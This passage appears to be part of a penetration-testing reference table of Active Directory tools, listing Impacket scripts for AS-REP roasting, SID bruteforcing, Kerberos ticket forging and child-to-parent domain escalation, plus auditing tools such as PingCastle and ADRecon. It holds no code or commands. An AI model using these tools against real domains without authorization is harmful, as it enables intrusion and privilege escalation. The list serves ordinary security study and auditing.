| [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) | Attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set. |  
| [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py) | SID bruteforcing tool. |  
| [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) | A tool for creation and customization of TGT/TGS tickets. |  
| [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) | Part of the Impacket toolset, It is a tool for child to parent domain privilege escalation. |  
| [Active Directory Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) | Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for off-line analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions. |  
| [PingCastle](https://www.pingcastle.com/documentation/) | Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on [CMMI](https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration) adapted to AD security). |  
| [Group3r](https://github.com/Group3r/Group3r) | Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).          |  
| [ADRecon](https://github.com/adrecon/ADRecon) | A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state. |  
  
  
